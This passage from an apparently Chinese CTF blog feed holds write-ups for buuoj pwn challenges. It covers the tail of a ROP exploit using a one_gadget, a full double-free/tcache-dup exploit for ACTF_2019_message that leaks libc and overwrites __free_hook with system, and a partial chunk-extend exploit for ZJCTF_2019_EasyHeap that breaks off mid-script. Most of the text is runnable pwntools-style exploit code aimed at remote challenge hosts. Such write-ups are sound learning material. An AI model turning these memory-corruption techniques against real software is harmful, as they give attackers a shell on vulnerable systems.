pay <span class="token operator">+=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>

<span class="token comment">#dbg('b *' + hex(start))</span>
<span class="token comment">#raw_input()</span>
s<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">'Byebye~\n'</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4f322</span>

leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'onegadget'</span><span class="token punctuation">,</span> onegadget<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span>
s<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>rop</tag>
        <tag>one_gadget</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF_2019_message</title>
    <url>/503970b4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之ACTF_2019_message</p>
<span id="more"></span>

<p>heap题，有add，delete，edit，show</p>
<p>没开PIE，got表不可写</p>
<p><del>(buuoj没有给libc，原题是有的，buuoj有原题链接，进去下载)</del></p>
<p>delete函数没有清空指针，存在double free：</p>
<p><img src="/images/503970b4/1.png" alt="delete"></p>
<p>add函数无<code>\x00</code>截断字符串，加上show函数应该可以泄露信息：</p>
<p><img src="/images/503970b4/2.png" alt="add"></p>
<p><img src="/images/503970b4/3.png" alt="show"></p>
<p>思路，double free，malloc到可以控制nodes的chunk</p>
<p>修改nodes，指向got表，泄露地址，再修改nodes指向free_hook，修改成system，然后free来getshell</p>
<p><del>本地ok，但远程偏移相差0x10（具体看注释），而且远程死活getshell不成功</del></p>
<p><del>题目的libc是2.23，无法getshell，换成本地的2.27，成了，具体原因不太清楚</del></p>
<p>buuoj用的是libc2.27有tcache机制，不需要fastbin范围检查，<del>exp一开始是按照2.23来写的，考虑了范围检查，就懒得改了</del></p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
<span class="token comment">#!/usr/bin/python2</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./ACTF_2019_message'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29881</span><span class="token punctuation">)</span>
<span class="token comment">#ctx.remote_libc = './libc.so.6'</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../../libc/libc-2.27.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#rs('remote')</span>
<span class="token comment"># print(ctx.libc.path)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"What's your choice: "</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Please input the length of message:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Please input the message:\n'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"What's your choice: "</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Please input index of message you want to delete:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"What's your choice: "</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Please input index of message you want to edit:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Now you can edit the message:\n'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">"What's your choice: "</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Please input index of message you want to display:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a\n'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a\n'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>


<span class="token comment">#stderr_addr =  0x602040</span>
nodes_addr <span class="token operator">=</span> <span class="token number">0x602060</span>


free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>nodes_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 3</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a\n'</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a\n'</span><span class="token punctuation">)</span> <span class="token comment"># 5</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 6</span>

<span class="token comment"># nodes[0].mem = ctx.binary.got['puts'], nodes[0].size = 0x20</span>


show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'The message: '</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>

leak<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'free'</span><span class="token punctuation">,</span> free_hook<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'malloc'</span><span class="token punctuation">,</span> malloc_hook<span class="token punctuation">)</span>


edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment">#dbg()</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>buuoj题目复现</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
        <tag>tcache dup</tag>
      </tags>
  </entry>
  <entry>
    <title>ZJCTF_2019_EasyHeap</title>
    <url>/70072382/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>buuoj刷pwn题之ZJCTF_2019_EasyHeap</p>
<span id="more"></span>


<p>heap题，没开PIE</p>
<p>有add，delete，edit，没有show</p>
<p>按照题意是要修改全局变量magic，来触发后门</p>
<p><img src="/images/70072382/1.png" alt="magic"></p>
<p><img src="/images/70072382/2.png" alt="backdoor"></p>
<p>其中edit函数，写入数据的长度可控</p>
<p><img src="/images/70072382/3.png" alt="edit"></p>
<p>直接chunk extend控制magic<br>(<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698">https://blog.csdn.net/Breeze_CAT/article/details/103788698</a>)</p>
<p>然而buuoj的环境不符合要求（与原题环境不一样），backdoor没用，改用修改<code>__free_hook</code>成<code>system</code>，的方法来getshell</p>
<p>还要注意fastbin对size的检查，可以利用stdin，stdout，stderr内容最高位都是0x7f，符合0x70~0x7f范围的fastbin</p>
<p>exp如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
<span class="token comment">#!/usr/bin/python2</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./easyheap'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25679</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'../../libc/libc-2.23.so'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#rs('remote')</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Content of heap:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Content of heap : '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>


magic_addr <span class="token operator">=</span> <span class="token number">0x6020C0</span>
heaparray_addr <span class="token operator">=</span> <span class="token number">0x6020E0</span>


add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 0 </span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># 3 隔离top chunk</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">'\xe1'</span><span class="token punctuation">)</span> <span class="token comment"># 1 + 2</span>
free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
add(0xd8, 'a' * 0x68 + p64(0x71) + p64(magic_addr-24+5)) # 1
add(0x68, 'a') # 2
add(0x68, 'a' * (magic_addr - (magic_addr-24+5)) + p64(0x1305+1)) # 4
# pwn
sla('Your choice :', '4869')
'''</span>

add<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>magic_addr<span class="token operator">-</span><span class="token number">24</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>heaparray_addr <span class="token operator">-</span> <span class="token punctuation">(</span>magic_addr<span class="token operator">-</span><span class="token number">24</span><span class="token operator">+</span><span class="token number">5</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 4</span>

edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>binary<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
